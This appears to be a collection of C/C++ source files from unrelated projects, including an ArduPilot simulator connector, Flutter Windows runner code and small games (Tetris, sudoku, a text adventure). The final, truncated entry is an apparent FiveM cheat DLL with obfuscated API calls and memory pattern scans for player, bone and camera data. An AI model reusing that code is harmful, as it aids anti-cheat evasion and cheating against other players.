0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101,\n    0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101,\n    0x3101, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011,\n    0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011,\n    0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x1000, 0x1000, 0x1000,\n    0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000,\n    0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000,\n    0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000,\n    0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000,\n    0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000,\n    0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000,\n    0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000",
    "/*\n   This program is free software: you can redistribute it and/or modify\n   it under the terms of the GNU General Public License as published by\n   the Free Software Foundation, either version 3 of the License, or\n   (at your option) any later version.\n\n   This program is distributed in the hope that it will be useful,\n   but WITHOUT ANY WARRANTY; without even the implied warranty of\n   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n   GNU General Public License for more details.\n\n   You should have received a copy of the GNU General Public License\n   along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n/*\n  simulator connector for Scrimmage simulator\n*/\n\n#include \"SIM_Scrimmage.h\"\n\n#if HAL_SIM_SCRIMMAGE_ENABLED\n\n#include <stdio.h>\n#include <inttypes.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n\n#include <AP_HAL/AP_HAL.h>\n\nextern const AP_HAL::HAL& hal;\n\nnamespace SITL {\n\nScrimmage::Scrimmage(const char *_frame_str) :\n    Aircraft(_frame_str),\n    prev_timestamp_us(0),\n    recv_sock(true),\n    send_sock(true)\n{\n}\n\nvoid Scrimmage::set_interface_ports(const char* address, const int port_in, const int port_out)\n{\n    fdm_port_in = port_in;\n    fdm_port_out = port_out;\n    fdm_address = address;\n    printf(\"ArduPilot sending to scrimmage on %s:%d\\n\",fdm_address, fdm_port_out);\n    printf(\"ArduPilot listening to scrimmage on %s:%d\\n\",fdm_address, fdm_port_in);\n\n    recv_sock.bind(fdm_address, fdm_port_in);\n\n    recv_sock.reuseaddress();\n    recv_sock.set_blocking(false);\n\n    send_sock.reuseaddress();\n    send_sock.set_blocking(false);\n}\n\nvoid Scrimmage::send_servos(const struct sitl_input &input)\n{\n    servo_packet pkt;\n\n    for (int i = 0; i < MAX_NUM_SERVOS; i++) {\n        pkt.servos[i] = input.servos[i];\n    }\n    send_sock.sendto(&pkt, sizeof(servo_packet), fdm_address, fdm_port_out);\n}\n\n/*\n  receive an update from the FDM\n  This is a blocking function\n */\nvoid Scrimmage::recv_fdm(const struct sitl_input &input)\n{\n    fdm_packet pkt;\n\n    // wait for packet from scrimmage\n    while (recv_sock.recv(&pkt, sizeof(pkt), 100) != sizeof(pkt));\n\n    // auto-adjust to simulation frame rate\n    uint64_t dt_us = 0;\n    if (pkt.timestamp_us > prev_timestamp_us)\n        dt_us = pkt.timestamp_us - prev_timestamp_us;\n    time_now_us += dt_us;\n\n    float dt_inv = 1.0e6 / ((float)dt_us);\n    if ( dt_inv > 100) {\n        adjust_frame_time(dt_inv);\n    }\n    prev_timestamp_us = pkt.timestamp_us;\n\n    // dcm_bl: dcm from body to local frame\n    dcm.from_euler(pkt.roll, pkt.pitch, pkt.yaw);\n    dcm.normalize();\n\n    // subtract gravity to get specific force measuremnt of the IMU\n    accel_body = Vector3f(pkt.xAccel, pkt.yAccel, pkt.zAccel) - dcm.transposed()*Vector3f(0.0f, 0.0f, GRAVITY_MSS);\n    gyro = Vector3f(pkt.rollRate, pkt.pitchRate, pkt.yawRate);\n\n    velocity_ef = Vector3f(pkt.speedN, pkt.speedE, pkt.speedD);\n\n    location.lat = pkt.latitude * 1.0e7;\n    location.lng = pkt.longitude * 1.0e7;\n    location.alt = pkt.altitude * 1.0e2;\n    position.z = (home.alt - location.alt) * 1.0e-2;\n\n\n    // velocity relative to air mass, in earth frame TODO\n    velocity_air_ef = velocity_ef;\n\n    // velocity relative to airmass in body frame TODO\n    velocity_air_bf = dcm.transposed() * velocity_air_ef;\n\n    battery_voltage = 0;\n    battery_current = 0;\n    rpm[0] = 0;\n    rpm[1] = 0;\n\n    airspeed = pkt.airspeed;\n    airspeed_pitot = pkt.airspeed;\n}\n\n/*\n  update the Scrimmage simulation by one time step\n */\nvoid Scrimmage::update(const struct sitl_input &input)\n{\n    send_servos(input);\n    recv_fdm(input);\n    update_mag_field_bf();\n}\n\n} // namespace SITL\n\n#endif\n",
    "#include <iostream>\n#include <cstdlib>\n\n#ifdef _WIN32\n#include <curses.h>\n#else\n#include <ncurses.h>\n#endif\n\n#include \"fancy_border.cpp\"\n\nclass staticBaseCommands {\nprivate:\n    static void clearTerminal() {\n    #ifdef _WIN32\n        system(\"cls\");\n    #else\n        system(\"clear\");\n    #endif\n    }\n    static void helpMenu() {\n        initscr();          // Initialize NCurses\n        cbreak();           // Disable line buffering\n        noecho();           // Don't echo the characters typed to the screen\n        nodelay(stdscr, TRUE); // Non-blocking read\n\n        clear();\n        std::string helpMenu = \"commands:\\n\\n look - makes observation of your surroundings\\n clear - clears text in terminal\\n quit - exits game \\n\\n\";\n\n        //printBorder(helpMenu);\n        printw(helpMenu.c_str());\n        printw(\"Press 'q' to exit help menu.\\n\");\n        refresh();\n\n        int ch;\n        while((ch = getch()) != 'q') {\n            if(ch != ERR) {\n                // Process the input\n                //printw(\"You pressed: %c\\n\", ch);\n            }\n        }\n        endwin(); // End NCurses mode\n\n    }\n\n    friend class engine;\n    friend class characterCreation;\n};\n\nclass characterCreation {\npublic:\n    void base() {\n        name();\n    }\nprivate:\n    void name() {\n        std::string characterName;\n        std::string characterInfo;\n        std::string characterGender = \"joe\";\n        std::cout << \"welcome to character creation\" << std::endl;\n        std::cout << \"Enter your character name: \";\n        std::getline(std::cin, characterName);\n        characterInfo = (\"name: \" + characterName + \"\\ngender: \" + characterGender);\n        staticBaseCommands::clearTerminal();\n        printBorder(characterInfo);\n    }\n};\n\n\nclass engine {\npublic:\n    void run() {\n        while (!gameEnd) {\n            input();\n            gameUpdate();\n            render();\n        }\n    }\nprivate:\n    bool gameEnd = false;\n\n\n    void input() {\n        std::string command;\n        std::cout << \">\";\n        std::getline(std::cin, command);\n\n        if (command == \"look\") {\n            std::cout << \"you are blind\" << std::endl;\n        }\n        else if (command == \"help\") {\n            staticBaseCommands::helpMenu();\n        }\n        else if (command == \"clear\") {\n            staticBaseCommands::clearTerminal();\n        }\n        else if (command == \"\") {\n        }\n        else if (command == \"quit\") {\n            exit();\n        } else {\n            std::cout << \"unknown command\" << std::endl;\n        }\n    }\n\n    void gameUpdate() {\n\n    }\n\n    void render() {\n\n    }\n\n    static void exit() {\n        ::exit(0);\n    }\n};\n\n\nint main() {\n    characterCreation characterCreation;\n    characterCreation.base();\n    engine engine;\n    engine.run();\n    return 0;\n}\n\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"ApplicationCore.h\"\n#include \"States/Menus/MainMenu/MainMenuState.h\"\n#include <iostream>\n\n//#define MEASURE\n\n#ifdef MEASURE\n#include <chrono>\n#endif \n\n\n\nApplicationCore::ApplicationCore()\n{\n\tsf::VideoMode currentMode = sf::VideoMode::getDesktopMode();\n\t//sf::VideoMode currentMode = sf::VideoMode::getFullscreenModes()[0];\n\twindow = std::make_unique<sf::RenderWindow>(currentMode, \"Elysian Enclave\", sf::Style::Fullscreen);\n\twindow->setFramerateLimit(60u); // 60 default\n\n\tsf::Vector2u uWindowSize = window->getSize();\n\tsf::Vector2f windowSize(static_cast<float>(uWindowSize.x), static_cast<float>(uWindowSize.y));\n\tstates.addState(std::make_unique<MainMenuState>(&states, windowSize), false);\n}\n\nApplicationCore::~ApplicationCore()\n{\n}\n\nvoid ApplicationCore::run()\n{\n\twhile (window->isOpen() && states.isActive())\n\t{\n#ifdef MEASURE\n\t\tauto t1 = std::chrono::high_resolution_clock::now();\n#endif\n\n\t\tstates.processChanges();\n\t\tupdate();\n\t\trender();\n\n#ifdef MEASURE\n\t\tauto t2 = std::chrono::high_resolution_clock::now();\n\t\tstd::chrono::duration<double, std::milli> ms_double = t2 - t1;\n\t\tstd::cout << ms_double.count() << \"ms\\n\";\n#endif\n\t}\n}\n\nvoid ApplicationCore::updateSFMLEvents()\n{\n\twhile (window->pollEvent(sfEvent)) {\n\t\tswitch (sfEvent.type)\n\t\t{\n\t\tcase sf::Event::Closed:\n\t\t\twindow->close();\n\t\t\tbreak;\n\t\tcase sf::Event::Resized:\n\t\t\t//resize funtcion here\n\t\t\tbreak;\n\t\tcase sf::Event::KeyPressed:\n\t\t\tif (sfEvent.key.code == sf::Keyboard::Escape)\n\t\t\t{\n\t\t\t\twindow->close();\n\t\t\t}\n\t\t\tbreak;\n\t\t//case sf::Event::TextEntered:\n\t\t\t//states.currentState()->handleEvent(sfEvent);\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t\tstates.currentState()->handleEvent(sfEvent);\n\t}\n}\n\nvoid ApplicationCore::update()\n{\n\tconst float deltaTime = deltaClock.restart().asSeconds();\n\tupdateSFMLEvents();\n\tstates.currentState()->update(deltaTime);\n}\n\nvoid ApplicationCore::render()\n{\n\twindow->clear(sf::Color::Black);\n\tstates.currentState()->render(*window);\n\twindow->display();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"xo_game\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//\n// Created by Jonas Langner on 01.04.24.\n//\n\n#include \"../../hdr/algorithm/SudokuFieldIterator.h\"\n#include \"../../hdr/SudokuField.h\"\n\nsudoku::algorithm::SudokuFieldIterator::SudokuFieldIterator(sudoku::SudokuField* sudoku_field_ptr): m_sudoku_field_ptr{sudoku_field_ptr} {}\n\nsudoku::algorithm::SudokuFieldIterator::SudokuFieldIterator(sudoku::algorithm::SudokuFieldIterator &&other) noexcept:\nm_sudoku_field_ptr{other.m_sudoku_field_ptr} {\n    other.m_sudoku_field_ptr = nullptr;\n}\n\nsudoku::algorithm::SudokuFieldIterator &\nsudoku::algorithm::SudokuFieldIterator::operator=(sudoku::algorithm::SudokuFieldIterator &&other) noexcept {\n    m_sudoku_field_ptr = other.m_sudoku_field_ptr;\n    other.m_sudoku_field_ptr = nullptr;\n\n    return *this;\n}\n\nvoid sudoku::algorithm::SudokuFieldIterator::reset() noexcept {\n    m_index = -1;\n}\n\nbool sudoku::algorithm::SudokuFieldIterator::has_next() const noexcept {\n    auto begin{m_sudoku_field_ptr->m_options.begin()};\n    begin += m_index + 1;\n    return begin < m_sudoku_field_ptr->m_options.end();\n}\n\nunsigned short sudoku::algorithm::SudokuFieldIterator::next() {\n    if (!has_next()) {\n        throw std::invalid_argument(\"there is no next element.\");\n    }\n\n    return m_sudoku_field_ptr->m_options.begin()[++m_index];\n}\n\n",
    "//\n// ooooooooooooo               .             o8o           \n// 8'   888   `8             .o8             `\"'           \n//      888       .ooooo.  .o888oo oooo d8b oooo   .oooo.o \n//      888      d88' `88b   888   `888\"\"8P `888  d88(  \"8 \n//      888      888ooo888   888    888      888  `\"Y88b.  \n//      888      888    .o   888 .  888      888  o.  )88b \n//     o888o     `Y8bod8P'   \"888\" d888b    o888o 8\"\"888P' \n//\n// Version del template para el Juego TETRIS en estilo RETRO con libreria RAYLIB ---------\n// Date 2024\n// Desarrollo de Natxo Varona\n//\n// Nota: Lista de los bloques del indice del taller de juegos retros\n//  1. Setup The Game Loop\n//  2. Creating the Grid\n//  3. Create the blocks\n//  4. Move de Blocks\n//  5. Rotate the blocks\n//  6. Checking for colisions\n//  7. Check for completed rows\n//  8. Game Over\n//  9. Create User Interface\n// 10. Add Score\n// 11. Add Next Block\n// 12. Add Sounds\n//--------------------------------------------------------------------------------------\n\n#include <iostream>\n#include <raylib.h>\n#include <vector>\n#include \"game.h\"\n#include \"colors.h\"\n\n// Definicion de variables y constantes para el juego -----------------\nColor Green = Color{38, 185, 154, 255};\nColor Dark_Green = Color{20, 160, 133, 255};\nColor Light_Green = Color{129, 204, 184, 255};\nColor Yellow = Color{243, 213, 91, 255};\nColor Grey = Color{29, 29, 29, 255};\n\ndouble lastUpdateTime = 0;\n\n// Funci\u00f3n para calcular el nivel actual basado en el n\u00famero de l\u00edneas eliminadas\nint calculateLevel(int lineDelete) {\n  // Nivel inicial que comienza el juego \n  int nivel = 1;\n\n  // Tabla de niveles y lineas requeridas para pasar de nivel\n  int lineasRequeridas[] = {0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100};\n\n  // Recorrer la tabla de niveles\n  for (int i = 0; i < sizeof(lineasRequeridas) / sizeof(lineasRequeridas[0]); ++i) {\n    // Si el n\u00famero de l\u00edneas borradas es mayor o igual que las l\u00edneas requeridas para el nivel actual, \n    //aumentar el nivel\n    if (lineDelete >= lineasRequeridas[i]) {\n      nivel = i + 1;\n    } else {\n      break;\n    }\n  }\n\n  // Devolver el nivel calculado\n  return nivel;\n}\n\n// Funci\u00f3n para calcular la velocidad de ca\u00edda de los bloques\nfloat calculateSpeed(int nivel) {\n  // Velocidad inicial\n  float velocidad = 0.2f;\n\n  // Incremento de velocidad por nivel\n  float incrementoVelocidad = 0.1f;\n\n  // Calcular la velocidad de ca\u00edda\n  velocidad += (nivel - 1) * incrementoVelocidad;\n\n  // Limitar la velocidad m\u00e1xima\n  if (velocidad > 2.0f) {\n    velocidad = 2.0f;\n  }\n\n  // Devolver la velocidad calculada\n  return velocidad;\n}\n\nbool EventTriggered(double interval){\n    double currentTime = GetTime();\n    if (currentTime - lastUpdateTime >= interval){\n        lastUpdateTime = currentTime;\n        return true;\n    }\n    return false;\n}\n\nint main() {\n    // Comenzamos el programa ------------------------------------------\n    std::cout << std::endl;\n    std::cout << \"Starting the game ...\" << std::endl;\n    std::cout << std::endl;\n\n    const int screen_width = 500;       // Sin interface entero seria 300\n    const int screen_height = 620;      // Sin interface entero seria 600\n    int FPS = 12;\n    int Cell_Size = 25;\n    float speedLevel = 0.2;\n\n    InitWindow(screen_width, screen_height, \"Mi Retro - Game of Tetris!\");\n    SetTargetFPS(FPS); \n    \n    Font font = LoadFontEx(\"Font/monogram.ttf\", 64, 0, 0);\n\n    // Iniciamos la clase Game que ira creando el restos de clases para inciar el juego\n    Game game = Game();\n\n    // Loop del juego de simulacion -------------------------------------\n    while (WindowShouldClose() == false) {\n    \n        UpdateMusicStream(game.music);  // Activamos la musica cuando comenzamos el juego\n        // 1. Event Handing ---------------------------------------------\n        game.HandleInput();\n        if (EventTriggered(speedLevel)){\n            game.MoveBlockDown();  \n        }\n        // 2. Updating State --------------------------------------------\n        game.level = calculateLevel(game.lines);\n        speedLevel = calculateSpeed(game.level);\n\n        // 3. Drawing Objects -------------------------------------------\n        BeginDrawing();\n        ClearBackground(darkBlue);\n        DrawTextEx(font, \"Score\", {365, 15}, 38, 2, WHITE);\n        DrawTextEx(font, \"Lines\", {365, 135}, 38, 2, WHITE);\n        DrawTextEx(font, \"Level\", {365, 250}, 38, 2, WHITE);\n        DrawTextEx(font, \"Next\", {370, 390}, 38, 2, WHITE);\n        DrawRectangleRounded({320, 55, 170, 60}, 0.3, 6, lightBlue);    // Rectangulo para Score\n        DrawRectangleRounded({320, 175, 170, 60}, 0.3, 6, lightBlue);    // Rectangulo para Lines\n        DrawRectangleRounded({320, 290, 170, 60}, 0.3, 6, lightBlue);    // Rectangulo para Level\n        DrawRectangleRounded({320, 430, 170, 180}, 0.3, 6, lightBlue);  // Rectangulo para Next Block\n        if (game.gameOver){\n            DrawRectangleRounded({20, 220, 170, 180}, 0.3, 6, lightBlue);    // Rectangulo para GameOver\n            DrawTextEx(fon",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = 